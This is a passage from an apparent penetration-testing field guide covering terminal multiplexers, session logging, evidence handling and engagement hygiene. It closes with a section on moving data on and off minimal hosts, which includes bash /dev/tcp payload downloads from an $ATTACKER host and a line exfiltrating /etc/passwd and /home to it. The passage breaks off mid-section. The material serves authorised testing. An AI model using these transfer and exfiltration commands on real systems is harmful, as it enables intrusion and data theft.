bind -T copy-mode-vi v send -X begin-selection
bind -T copy-mode-vi C-v send -X rectangle-toggle
bind -T copy-mode-vi y send -X copy-selection-and-cancel

# Clipboard through the terminal, works over SSH with no X forwarding
set -g set-clipboard on

# Synchronised panes with a loud indicator
bind C-x setw synchronize-panes \; display "sync #{?pane_synchronized,ON,OFF}"
set -g pane-active-border-style 'fg=green'

# Mouse for resizing and scrollback, because fighting it wastes time
set -g mouse on

# No escape sequence delay, so vim and readline feel right
set -s escape-time 10

# Focus events, so editors inside tmux notice external file changes
set -g focus-events on

# UTC clock in the status bar: any screenshot now carries its own timestamp
set -g status-right ' #(TZ=UTC date -u +%%Y-%%m-%%dT%%H:%%M:%%SZ) '
set -g status-interval 5

# Never let a window title lie about which host the pane is on
setw -g automatic-rename on
set -g set-titles on
```

Two notes on that file. The `status-right` clock is an evidence trick, not decoration: a timestamp burned into every screenshot you take saves a lot of argument later about when something happened, and UTC removes the timezone question entirely. The doubled `%%` is required because tmux processes the string through `strftime` style formatting first.

Colour handling is the one thing that reliably breaks. Inside tmux, `TERM` becomes `screen` or `tmux` derived, and truecolour is only passed through if you tell tmux the outer terminal supports it:

```text
set -g default-terminal "tmux-256color"
set -as terminal-features ",xterm-256color:RGB"
```

`terminal-features` requires tmux 3.2 or newer. On older builds the equivalent is `set -ga terminal-overrides ",xterm-256color:Tc"`. If `tmux-256color` is not in the local terminfo database, tmux refuses to start cleanly; fall back to `screen-256color`, which is present essentially everywhere. Separately, when you SSH from inside tmux to an old target, its terminfo may not know `tmux-256color` and every curses program will error out. `TERM=xterm ssh $TARGET` is the fix, and it is worth an alias.

### Scripted session layouts for an engagement

Rebuilding a workspace by hand at the start of each day is wasted time and, worse, produces a slightly different layout every day so your muscle memory never settles. Script it. Plain tmux commands are enough and have no dependencies, which is exactly what you want on a jump box:

```bash
#!/usr/bin/env bash
set -euo pipefail

ENG="${1:?usage: engagement-name}"
ROOT="$HOME/engagements/$ENG"
S="$ENG"

tmux has-session -t "$S" 2>/dev/null && exec tmux attach -t "$S"

tmux new-session  -d -s "$S" -n notes -c "$ROOT"
tmux send-keys    -t "$S:notes" "vim $ROOT/notes/journal.md" C-m

tmux new-window   -t "$S" -n scan  -c "$ROOT/scans"
tmux new-window   -t "$S" -n creds -c "$ROOT/creds"
tmux new-window   -t "$S" -n ad    -c "$ROOT/loot"
tmux new-window   -t "$S" -n c2    -c "$ROOT"

# Monitoring window: four panes, tiled
tmux new-window   -t "$S" -n watch -c "$ROOT"
tmux split-window -t "$S:watch" -h -c "$ROOT"
tmux split-window -t "$S:watch" -v -c "$ROOT"
tmux select-pane  -t "$S:watch.1"
tmux split-window -t "$S:watch" -v -c "$ROOT"
tmux select-layout -t "$S:watch" tiled
tmux send-keys -t "$S:watch.1" 'tail -F logs/nmap.log' C-m
tmux send-keys -t "$S:watch.2" 'watch -n 30 "wc -l scope/targets.txt loot/*.txt 2>/dev/null"' C-m
tmux send-keys -t "$S:watch.3" 'sudo tcpdump -ni any -s0 -w pcap/$(date -u +%Y%m%dT%H%M%SZ).pcap' C-m

tmux select-window -t "$S:notes"
exec tmux attach -t "$S"
```

Points worth copying out of that script. `has-session` then `attach` makes it idempotent, so running it twice is safe and rerunning it after a disconnect is the normal way to get back in. Every window is opened with `-c` at the directory relevant to its job, so you are never one `cd` away from the right place. Panes are addressed as `session:window.pane`, which is the addressing scheme every tmux command accepts and the thing to learn if you want to drive tmux from other scripts.

The declarative alternatives are `tmuxp` (Python, YAML or JSON session definitions) and `tmuxinator` (Ruby, YAML). Both are more readable than a pile of `send-keys` for large layouts, both are one more dependency to install on a box you may not control. Native tmux also reads a plain config with `tmux source-file layout.conf`, which gets you declarative layout without any third party tool.

One habit worth building: never bake credentials into a `send-keys` line. `send-keys` content lands in your shell history, in the script, and in the target shell's history all at once. Type secrets by hand or read them from a file the script references.

### Alternatives, honestly assessed

| | tmux | GNU screen | zellij |
| --- | --- | --- | --- |
| Availability | Near universal, in every distro repo, often preinstalled | Even more universal, present on ancient and embedded systems | Rarely preinstalled, single static binary is easy to drop |
| Default prefix | `C-b` | `C-a` | Modal, no single prefix |
| Learning curve | Moderate, needs a config to feel good | Low for basics, ugly beyond them | Lowest, on screen hints for every mode |
| Splits | First class, arbitrary nesting, named layouts | Workable but clumsy, regions are not persistent across detach in older versions | First class, plus floating and stacked panes |
| Scripting | Excellent, every action is a command, `send-keys` and format strings | Limited, `screen -X` exists but is awkward | Good, `zellij action` mirrors the keybinds, layouts in KDL |
| Built in logging | `pipe-pane` | `-L` / `C-a H` | Available, less mature |
| Session persistence across reboot | Plugin (`resurrect` / `continuum`) | No | Built in serialisation in recent versions |
| Config format | Own DSL, terse | Own DSL, terser and stranger | KDL, verbose but discoverable |

**screen** is the tool to know because it is the one that will already be installed. On a stripped appliance, a hardened Linux host, a router, or a decade old box, `screen` exists and `tmux` does not. Learn the survival set and nothing more:

```bash
screen -S recon              # new named session
screen -ls                   # list
screen -r recon              # reattach
screen -dr recon             # detach elsewhere, then reattach here
screen -x recon              # attach alongside an existing client, shared view
screen -L -Logfile logs/screen.log -S recon   # log the session to a file
```

Inside screen, prefix is `C-a`: `C-a d` detach, `C-a c` new window, `C-a "` window list, `C-a A` rename, `C-a |` split vertically, `C-a S` split horizontally, `C-a Tab` move between regions, `C-a Esc` enter copy mode, `C-a ]` paste, `C-a H` toggle logging for the current window, `C-a k` kill window. Note that `C-a` collides with readline's start of line, which is why screen users develop the habit of `C-a a`.

**zellij** is the modern option and is genuinely good for people who do not want to configure a multiplexer. Its selling point is discoverability: the status bar shows the available modes and keys, so there is no window between "installed it" and "productive". Sessions serialise to disk, floating panes are useful for a scratch shell, and `zellij action` gives you scripting that mirrors the interactive keys. Against it: it is not installed anywhere by default, its keybinds collide with common terminal shortcuts until remapped, and the ecosystem of tooling that assumes tmux (session managers, integrations, every existing runbook) does not assume zellij. Carry it as a static binary if you like it; do not make it a dependency of your workflow when your workflow has to run on hosts you did not build.

```bash
zellij                            # new session, generated name
zellij -s recon                   # named
zellij ls
zellij attach recon
zellij attach --create recon      # idempotent
zellij --layout ./engagement.kdl
zellij action new-pane -d right
```

Two smaller tools worth knowing exist: `dtach` and `abduco` do nothing but detach and reattach, with no splits, no status bar, no scrollback management. That is occasionally exactly right, for example wrapping a single long lived process that produces its own logs, where a full multiplexer is pointless overhead.

### Where the multiplexer should run

Run it on the jump box, not your laptop, and the reasoning is worth being explicit about because the wrong answer feels more comfortable.

Your laptop suspends. It roams between wifi networks and gets a new address. Its VPN rekeys and occasionally drops. Every one of those events tears down the TCP connections that your SSH sessions ride on. If the multiplexer is local, the sessions inside it survive but every SSH connection out of them is dead, which means every remote shell, every C2 client connection, and every scan running on the remote side is dead too. You kept the frame and lost the picture.

With the multiplexer on the jump box:

- Processes live next to the target network, on stable routing, with latency measured in the same datacentre rather than across a consumer uplink. Interactive shells are usably responsive and timing sensitive tooling behaves.
- Your laptop is a dumb display. Losing it costs you a reattach.
- Evidence and logs accumulate on a host you can archive at the end, rather than being scattered across whatever machine you happened to be using.
- A colleague can attach to the same session, see exactly what you see, and take over. That is not possible if the state is on your laptop.
- Nothing sensitive lands on the endpoint that leaves the building with you.

The natural pairing is `mosh` plus tmux, not one or the other. `mosh` replaces the SSH transport with a UDP protocol that survives address changes and long sleeps, so your connection to the jump box stops breaking. It has weak scrollback handling of its own, which does not matter at all because tmux is providing the scrollback. `mosh` keeps you connected, tmux keeps the work alive when even `mosh` gives up, and the multiplexer on the jump box means "gives up" costs you a reattach.

For shared sessions, run the tmux server on an explicit socket with group permissions rather than sharing an account:

```bash
tmux -S /var/tmp/ops-socket new -d -s ops
chgrp operators /var/tmp/ops-socket
chmod 770 /var/tmp/ops-socket
tmux -S /var/tmp/ops-socket attach -t ops
```

Every member of `operators` attaches to the same session with their own login, which means `auth.log` and your session logs still attribute actions to individuals. That attribution is the entire reason to prefer this over everyone using one shared account.

## Session logging and evidence capture

Logging is not paperwork. It is the mechanism that lets you answer, hours or weeks later, exactly what you ran, in what order, against what, and what came back. The source notes sprinkled `script -a` in front of a few commands, which is the right instinct applied inconsistently, and inconsistent logging is worse than none because you will trust it.

### Why you log everything

Four reasons, in rough order of how often they save you.

**Retracing your own steps.** You found a credential four hours ago in a wall of `nxc` output and now you need it. You changed a registry value and need to know the original. You ran a spray and need to know exactly which accounts were touched so you do not lock anyone out on the second pass. All of this is trivial with a log and archaeology without one.

**Report evidence.** Findings need reproduction steps and output. Reconstructing a command line from memory at report writing time produces commands that do not work, which is how a finding gets bounced back to you a week later.

**Proving what you did not touch.** This is the one that matters most and gets thought about least. When something breaks on the client's estate during your test window, the question is whether you caused it. A complete, timestamped log of every command you issued is the only thing that answers that question. Without it, the honest answer is "probably not", which is not an answer anyone accepts. With it, you can show the exact minute you were somewhere else entirely.

**Deconfliction.** On a red team where a blue team is watching, they will ask "was 14:32 you?". You need to be able to answer in seconds.

### script, with timing

`script` puts a pty between your shell and the terminal and writes everything through it to a file. It captures both what you typed and what came back, which shell history does not.

```bash
# Basic, append to an existing log
script -a logs/session.log

# Flush after every write so the log survives a kill, and quiet the banner
script -qfa logs/session.log

# Separate output and timing streams, which makes replay possible
script --log-out logs/session.log --log-timing logs/session.timing

# Log input as well as output, so keystrokes including control characters are captured
script --log-io logs/session.io

# Run one command and exit, propagating its exit status
script -qec 'nmap -sS -p- $TARGETS' logs/nmap-full.log
```

With a timing file you can replay the session at its original pace, which is the closest thing to a screen recording that a text log gets:

```bash
scriptreplay --log-timing logs/session.timing --log-out logs/session.log
scriptreplay --log-timing logs/session.timing --log-out logs/session.log --divisor 4
scriptreplay --log-timing logs/session.timing --log-out logs/session.log --maxdelay 2
```

`--divisor 4` plays at four times speed, `--maxdelay 2` collapses any pause longer than two seconds, and together they turn a six hour session into something watchable. During playback the up and down arrows adjust speed by 0.1 each press, and `--summary` prints the session's statistics without replaying it. `scriptlive` re-executes a logged session's *input* rather than replaying its output, running it in a fresh pseudoterminal under your shell, which is occasionally useful for reproducing something and dangerous for exactly the reason you would expect. util-linux's own manual page makes the same point and suggests `scriptreplay --stream in --log-in typescript` to read what the session will actually run before you let `scriptlive` run it.

The long options above are util-linux, which is what you have on Linux. The `script` on macOS and the BSDs is a different implementation: `script -a file` works, `-q` and `-t` exist, but `--log-timing` and `--log-io` do not. If you are logging from a Mac, either use the BSD flags or do your logging on the Linux jump box, which you should be doing anyway.

Start logging automatically rather than remembering to. In your shell profile on the jump box:

```bash
# ~/.bashrc on the jump box
if [[ -z "${SCRIPT_LOGGING:-}" && $- == *i* ]]; then
    export SCRIPT_LOGGING=1
    LOGDIR="$HOME/engagements/current/logs/shell"
    mkdir -p "$LOGDIR"
    exec script -qfa "$LOGDIR/$(date -u +%Y%m%dT%H%M%SZ)-$$-${USER}.log"
fi
```

The `SCRIPT_LOGGING` guard is essential: `script` spawns a shell, that shell sources the profile, and without the guard you get infinite recursion until the process limit stops you. The `$-` test keeps non interactive shells, including everything `scp` and `rsync` rely on, out of it.

One aside that is worth flagging because it comes up again in the Linux Post-Exploitation section: `script` is also the standard way to get a proper pty out of a dumb reverse shell, `python3 -c 'import pty; pty.spawn("/bin/bash")'` being the other. That is a shell stabilisation technique rather than a logging one, but it is the same mechanism, and it means `script` is worth knowing is present on a target.

### tmux pipe-pane

`script` wraps a shell. `pipe-pane` taps a pane that is already running, from the outside, which solves the case where you are mid session and realise you are not logging.

```bash
# Start logging the current pane
tmux pipe-pane -o 'cat >> ~/engagements/current/logs/tmux-#S-#I.#P.log'

# Same, with a timestamp prefixed to every line (ts is from moreutils)
tmux pipe-pane -o 'ts "%Y-%m-%dT%H:%M:%S%z" >> ~/logs/tmux-#S-#I.#P.log'

# Stop logging this pane
tmux pipe-pane
```

`-o` makes it a toggle: if a pipe is already running on that pane the command turns it off instead of stacking a second one. The `#S`, `#I` and `#P` format strings expand to session name, window index and pane index, so each pane gets its own file and you can tell which was which afterwards.

To log every pane in a session for the whole engagement, hook pane creation:

```text
# In .tmux.conf: log every new pane from birth
set -g @logdir "~/engagements/current/logs/panes"
set-hook -g after-new-window  'pipe-pane -o "cat >> ~/engagements/current/logs/panes/#S-#I.#P.log"'
set-hook -g after-split-window 'pipe-pane -o "cat >> ~/engagements/current/logs/panes/#S-#I.#P.log"'
bind P pipe-pane -o 'cat >> ~/engagements/current/logs/panes/#S-#I.#P.log' \; display 'logging toggled'
```

The `tmux-logging` plugin packages this along with a "save complete history" binding that is really `capture-pane -S -` behind a keystroke. Either is fine; the hooks are three lines and no dependency.

`pipe-pane` output contains every escape sequence the pane emitted, including cursor movement and colour, so it is raw and needs cleaning before a human reads it. See the ANSI stripping section below.

### asciinema

`asciinema` records a terminal session as a structured, timed cast file, and plays it back in a terminal or in a browser. Where `script` plus timing gives you a replayable text stream, asciinema gives you a portable artefact you can hand to someone, embed in a report, or convert to a GIF.

```bash
asciinema rec logs/casts/priv-esc.cast
asciinema rec --append logs/casts/priv-esc.cast
asciinema rec -i 2 logs/casts/priv-esc.cast          # cap idle gaps at 2 seconds
asciinema rec -c 'nxc smb targets.txt -u u -p p' logs/casts/spray.cast
asciinema play logs/casts/priv-esc.cast
asciinema play -s 3 logs/casts/priv-esc.cast         # 3x speed
asciinema cat logs/casts/priv-esc.cast               # dump the text content
```

The cast file is JSON, one event per line after a header, so it is greppable and diffable and you can process it with `jq` like any other tool output. `agg` converts a cast to an animated GIF, which is the thing to put in a report when a static screenshot cannot show the sequence. Record locally and do not upload: `asciinema rec` writes to the file you name and only talks to the public server if you explicitly ask it to, but be deliberate about that because a cast of an engagement contains credentials.

Use asciinema for the handful of moments worth demonstrating, and `script` or `pipe-pane` for the exhaustive record. Recording everything as casts produces a pile of artefacts nobody will ever watch.

### Timestamping

A log without timestamps answers "what" but not "when", and "when" is the half you need for deconfliction. Several layers, use more than one.

```bash
# Prefix every line of a pipeline with a timestamp (ts, from moreutils)
nmap -sS -iL targets.txt | ts '%Y-%m-%dT%H:%M:%S%z' | tee -a logs/nmap.log

# Relative timestamps, elapsed since the previous line
long-running-thing | ts -i '%.s'

# gawk equivalent when moreutils is not installed
some-command | awk '{ print strftime("%Y-%m-%dT%H:%M:%S%z"), $0; fflush() }'

# Pure shell fallback, slow but universal
some-command | while IFS= read -r l; do printf '%s %s\n' "$(date -u +%FT%TZ)" "$l"; done
```

Put the time in the prompt so it appears in the `script` log on every command boundary, which is often more useful than per line stamps:

```bash
# Bash: \D{} takes a strftime format
export PS1='[\D{%Y-%m-%dT%H:%M:%S%z}] \u@\h:\w\$ '

# Timestamped shell history that actually persists across many sessions
export HISTTIMEFORMAT='%Y-%m-%dT%H:%M:%S%z '
export HISTSIZE=1000000
export HISTFILESIZE=1000000
export HISTCONTROL=
shopt -s histappend
PROMPT_COMMAND='history -a'
```

Note the deliberately empty `HISTCONTROL`. The common default of `ignorespace` or `ignoreboth` silently drops any command starting with a space, and dropping commands is exactly what you do not want in your own record. `history -a` in `PROMPT_COMMAND` appends after every command rather than only on clean exit, so a killed terminal does not take the last hour of history with it.

Timestamp your filenames too, in ISO 8601 with a UTC marker, so they sort lexicographically into chronological order:

```bash
OUT="scans/$(date -u +%Y%m%dT%H%M%SZ)-nmap-tcp-full"
nmap -sS -p- -iL scope/targets.txt -oA "$OUT"
```

`20250824T142530Z-nmap-tcp-full.gnmap` tells you what and when with no metadata lookup, and `ls` puts it in the right place. `scan1.txt`, `scan_new.txt` and `scan_new_FINAL.txt` do not.

### Stripping ANSI escapes from logs

Raw logs are full of escape sequences: colour, cursor movement, progress bar rewrites, window title changes. They make the file unreadable in a report and they break `grep`, because a colourised match has escape bytes in the middle of the string you are searching for.

```bash
# Colour and most CSI sequences, GNU sed
sed -E 's/\x1B\[[0-9;?]*[a-zA-Z]//g' logs/session.log > logs/session.clean.log

# BSD and macOS sed do not understand \x1B, so inject the byte with printf
sed -E "s/$(printf '\033')\\[[0-9;?]*[a-zA-Z]//g" logs/session.log > logs/session.clean.log

# Thorough: CSI sequences, OSC title strings, charset selection, and stray carriage returns
perl -pe 's/\e\[[0-9;?]*[ -\/]*[\@-~]//g; s/\e\][^\a]*(?:\a|\e\\)//g; s/\e[()][A-Za-z0-9]//g; s/\r(?!\n)//g' \
    logs/session.log > logs/session.clean.log

# Purpose built, if it is installed
ansifilter -i logs/session.log -o logs/session.clean.log

# script output specifically: also collapse backspace overstrikes
col -bp < logs/session.log | sed -E 's/\x1B\[[0-9;?]*[a-zA-Z]//g' > logs/session.clean.log

# Check what escape bytes are left
cat -v logs/session.clean.log | grep -n '\^\[' | head
```

The source's regex was `s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g`, which handles the common colour, cursor column and erase line sequences and silently leaves everything else, including OSC title strings and any sequence with more than two parameters. It is not wrong so much as incomplete, and incomplete is how you end up with escape bytes embedded in a report table.

Two structural points. First, prevention beats cleanup: most tools honour `NO_COLOR=1` or have a `--no-color` flag, and many detect that stdout is not a terminal and disable colour on their own, so piping through `tee` often produces a clean log for free. Second, always keep the raw log as well as the clean one. The raw file is the artefact; the clean file is a derived view for reading. Never overwrite the original in place, and never edit a log by hand.

Related annoyance: many tools buffer heavily when their output is a pipe rather than a terminal, so `tool | tee log` appears to hang and then dumps everything at once. Force line buffering:

```bash
stdbuf -oL -eL some-tool | ts '%FT%T%z' | tee -a logs/tool.log
unbuffer some-tool | tee -a logs/tool.log       # from expect, keeps the tool believing it has a tty
```

`stdbuf` fails against programs that set their own buffering explicitly; `unbuffer` works because it allocates a pty, at the cost of reintroducing the colour codes you just learned to strip.

### The engagement working tree

One directory per engagement, the same structure every time, created by a script so it is never slightly different. Consistency is the whole point: you should be able to find last year's credential file in a client tree you have never opened, and any tooling or script you write should work across every engagement without adjustment.

```text
engagements/2025-08-acme-internal/
├── scope/
│   ├── targets.txt          # the canonical target list, everything derives from this
│   ├── in-scope.txt         # as supplied by the client, verbatim, never edited
│   ├── exclude.txt          # explicit out of scope, applied at generation time
│   ├── contacts.md          # who to call, escalation path, test window
│   └── rules-of-engagement.md
├── recon/                   # OSINT, DNS, ASN, certificate transparency
├── scans/                   # raw tool output, timestamped, never edited
│   ├── nmap/
│   ├── web/
│   └── ad/
├── loot/                    # files pulled off targets, one directory per host
│   └── DC01/
├── creds/                   # credentials and hashes, tightest permissions in the tree
│   ├── valid.txt
│   ├── hashes/
│   └── tickets/
├── logs/                    # session logs, per pane logs, tool logs
│   ├── shell/
│   ├── panes/
│   └── casts/
├── screenshots/             # evidence images, timestamped filenames
├── pcap/
├── payloads/                # what you built and dropped, so you can clean up
├── tools/                   # engagement specific tooling and one off scripts
├── notes/
│   ├── journal.md           # append only, timestamped, what you did and thought
│   └── findings/            # one file per finding, written as you go
└── report/
```

The rules that make it work matter more than the exact tree.

**`scans/` is immutable.** Raw tool output goes in and is never edited. If you need a filtered version, write it somewhere else. The moment you start hand editing scan output you no longer have evidence, you have notes.

**`payloads/` is a cleanup list.** Every binary, script, scheduled task definition, service and web shell you drop on a target gets a copy here, along with where it went. At the end of the engagement this directory is the checklist for removing your own artefacts, and the answer to "did you leave anything behind". Keep a plain text `payloads/deployed.txt` mapping local file to remote path to host to timestamp, because a directory of files does not tell you where they went.

**`notes/journal.md` is append only and timestamped.** Every non trivial action gets a line. This is the human readable index into the machine readable logs, and it is what you actually write the report from. Rewriting history in it defeats the purpose.

**Findings get written when you find them,** not at the end. The details you will need, the exact URL, the exact command, the exact output, are precisely the details you will have forgotten by Friday.

Create it from a script, and put the whole tree on an encrypted volume:

```bash
#!/usr/bin/env bash
set -euo pipefail
ENG="${1:?usage: newengagement client-name}"
ROOT="$HOME/engagements/$(date -u +%Y-%m)-$ENG"
mkdir -p "$ROOT"/{scope,recon,scans/{nmap,web,ad},loot,creds/{hashes,tickets},logs/{shell,panes,casts},screenshots,pcap,payloads,tools,notes/findings,report}
chmod 700 "$ROOT"
chmod 700 "$ROOT/creds" "$ROOT/loot"
umask 077
: > "$ROOT/notes/journal.md"
printf '# %s\n\nStarted %s\n' "$ENG" "$(date -u +%FT%TZ)" > "$ROOT/notes/journal.md"
ln -sfn "$ROOT" "$HOME/engagements/current"
echo "$ROOT"
```

The `current` symlink is what lets the shell profile logging snippet above and every other helper refer to a fixed path while pointing at whichever engagement is live.

### Credential and loot hygiene

Client data on your disk is a liability with a shelf life. Handle it accordingly.

**Permissions and encryption.** `umask 077` for the whole engagement, `chmod 700` on the tree, `600` on files in `creds/`. Full disk encryption on the machine is the baseline, and it is what actually protects the data at rest. For anything that leaves the working tree, encrypt it explicitly:

```bash
age -r age1... -o loot.tar.age loot.tar        # modern, simple, keys are short strings
gpg -c --cipher-algo AES256 loot.tar           # symmetric, universally available
openssl enc -aes-256-ctr -pbkdf2 -salt -in loot.tar -out loot.tar.enc
tar czf - loot | age -r age1... > loot.tar.age # stream, no plaintext intermediate on disk
```

Note the last form. Writing `loot.tar` and then encrypting it leaves a plaintext tarball on disk between the two commands, and deleting it does not reliably remove the blocks. Stream instead.

**Never commit an engagement tree to a shared repository.** If you use git locally for the notes, and it is a reasonable thing to do, keep it local, and make the exclusions explicit rather than trusting yourself to remember:

```text
# .gitignore at the engagement root
creds/
loot/
pcap/
logs/
*.kirbi
*.ccache
*.ntds
*.dit
*.keytab
*.pfx
*.p12
*.kdbx
*id_rsa*
*.pcap
```

The most common way client credentials end up somewhere they should not is a tool that helpfully initialised a repository, or a notes application that syncs to a cloud account. Check what your editor and your notes tool are doing with the directory before you put hashes in it.

**Kerberos artefacts are credentials.** A `.ccache` or `.kirbi` is a usable credential until its ticket expires, and a `.keytab` or exported `.pfx` may not expire in any useful sense. Track where they are, and clear the environment when you are done with a context:

```bash
klist                    # what is in the current cache
kdestroy                 # destroy it
unset KRB5CCNAME
```

Leaving `KRB5CCNAME` pointing at a stale cache is also a great way to waste an hour debugging authentication failures that are just an expired ticket, so this is hygiene with an immediate payoff.

**Delete secrets when you are done, and understand what deletion means.** On a spinning disk, `shred` overwrites in place and does what it says. On an SSD, wear levelling and the flash translation layer mean the original blocks may still exist and be unreachable from the filesystem, so overwrite tools cannot guarantee anything. The honest control on modern hardware is full disk encryption plus destroying the key, not per file overwriting. So: keep secrets on an encrypted volume from the start, remove them normally at the end, and rely on the encryption rather than on `shred` theatre.

```bash
shred -u -n 1 creds/valid.txt         # meaningful on rotational media
rm -P file                            # BSD and macOS equivalent
find . \( -name '*.ccache' -o -name '*.kirbi' -o -name '*.keytab' \) -print -delete
```

Also clear the places secrets leak into by accident: shell history (`history -d`, or better, do not type them), tmux paste buffers (`tmux delete-buffer -b 0`, `tmux clear-history`), the system clipboard, and any editor swap or undo files sitting next to a credential file.

**Hash the evidence you intend to rely on.** A manifest costs nothing and pre-empts any argument about whether a file changed after collection:

```bash
find loot scans -type f -exec sha256sum {} + | sort -k2 > evidence.sha256
sha256sum -c evidence.sha256
```

**Have a retention decision, and act on it.** At the end of the engagement, deliverables go to the client through whatever channel is agreed, and the working tree gets deleted on a defined date. An old engagement tree you forgot about is a breach waiting for someone else's incident report.

## Shell tricks for a box with nothing installed

The recurring situation: you have code execution on a host, and it has no `curl`, no `wget`, no Python, no compiler, and `/tmp` is mounted `noexec`. Everything below is about getting data on and off that box, and finding out what it is doing, using only what a minimal Linux userland guarantees.

First, find out what you actually have. Do this once, up front, rather than discovering the absence of `curl` in the middle of something:

```bash
for b in curl wget nc ncat socat python3 python perl ruby php openssl ssh scp sftp tftp \
         busybox base64 xxd od gzip tar dd awk gawk ss netstat lsof; do
    command -v "$b" >/dev/null 2>&1 && printf '%-10s %s\n' "$b" "$(command -v "$b")"
done
echo "shell: $0  bash: ${BASH_VERSION:-none}"
mount | grep -E 'noexec|nosuid|tmpfs'
```

That last line is the one people skip. Knowing before you try that `/tmp` is `noexec` and `/dev/shm` is not saves a confusing "permission denied" on a binary you know is executable.

### Downloading files with bash and /dev/tcp

**What it is.** Bash can open a TCP socket as a file descriptor, so a shell with no network tools at all can still pull a file down.

**Why it works.** `/dev/tcp/host/port` is not a device node and does not exist on the filesystem, which is the detail that confuses people the first time. It is a special path that bash's own redirection code intercepts before any syscall to open a file happens. Bash parses the host and port, calls `socket()` and `connect()` itself, and hands you the resulting descriptor as though a file had been opened. There is nothing on disk to look for, nothing to remove, and no separate process. The same applies to `/dev/udp/host/port`.

**Preconditions.** This is a bash feature, compiled in with `--enable-net-redirections`, which is the default in essentially every distribution build. It is not POSIX and it is not present in `dash`, `ash`, `busybox sh`, or most other `/bin/sh` implementations. `/bin/sh` on Debian and Ubuntu is `dash`, so a script with a shebang of `#!/bin/sh` will fail even on a host with bash installed. Some hardened distributions and some embedded builds compile it out. Outbound TCP to the port must be permitted. If bash lacks the feature you get `No such file or directory` for the `/dev/tcp` path, which is a misleading but distinctive error.

**Commands.** The simplest case, a raw TCP transfer with a listener on your side:

```bash
# On $ATTACKER
nc -lvnp 8080 < payload.bin

# On the target, note the PORT, not a filename
bash -c 'cat < /dev/tcp/$ATTACKER/8080' > payload.bin
```

**Common mistake.** The source wrote this as `bash -c 'cat < /dev/tcp/$TARGET/filename' > filename.ext`. There is no filename component in a `/dev/tcp` path, only host and port. Putting a filename there gets you a failed resolution of the "port". The remote side decides what bytes to send, which is why the listener above is `nc -lvnp 8080 < payload.bin`; the target has no way to request a particular file over a raw socket.

To fetch a specific file from an ordinary web server, speak HTTP yourself. Open the socket read-write on a descriptor, write a request, read the response:

```bash
exec 3<>/dev/tcp/$ATTACKER/8000
printf 'GET /linpeas.sh HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' "$ATTACKER" >&3
cat <&3 > /dev/shm/resp.raw
exec 3<&-
exec 3>&-

# Strip the HTTP response headers: delete everything up to and including the blank line
sed '1,/^\r$/d' /dev/shm/resp.raw > /dev/shm/linpeas.sh
```

The `\r\n` line endings are mandatory, HTTP is specified with CRLF and many servers will not answer a request with bare newlines. `Host:` is mandatory for HTTP/1.1. `Connection: close` is what makes `cat <&3` terminate: without it the server holds the connection open with keep-alive and your `cat` blocks forever. Serve over HTTP/1.0 instead and you can omit the header, but sending it is one line and always correct.

A function worth keeping, which handles the header stripping and works when only bash exists:

```bash
bget() { # bget host port path outfile
    exec 3<>"/dev/tcp/$1/$2" || return 1
    printf 'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: curl/8.0\r\n\r\n' "$3" "$1" >&3
    local hdr=1
    while IFS= read -r line <&3; do
        if [ -n "$hdr" ]; then
            [ "$line" = $'\r' ] && hdr=
            continue
        fi
        printf '%s\n' "$line"
    done > "$4"
    exec 3<&- 3>&-
}
bget "$ATTACKER" 8000 /script.sh /dev/shm/script.sh
```

Note the limitation: reading with `read -r` line by line makes this text safe and binary unsafe, because NUL bytes and lines without trailing newlines do not survive. For binaries, transfer base64 and decode, or use the raw `cat <&3` form and strip headers with `sed`.

Pushing data out is the same mechanism in reverse, which is the exfiltration primitive when nothing else is available:

```bash
# Listener on $ATTACKER
nc -lvnp 8080 > exfil.tar.gz

# Target
tar czf - /etc/passwd /home > /dev/tcp/$ATTACKER/8080

# Or as an HTTP POST to a real server
```
